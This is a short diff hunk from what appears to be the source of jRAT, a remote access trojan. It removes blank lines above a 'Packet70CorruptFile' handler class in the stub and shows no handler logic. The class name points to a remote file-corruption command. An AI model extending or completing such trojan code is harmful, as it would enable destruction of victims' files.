@@ -6,8 +6,6 @@ import java.util.Random;
 
 import pro.jrat.stub.Connection;
 
-
-
 public class Packet70CorruptFile extends AbstractIncomingPacket {
 
 	@Override
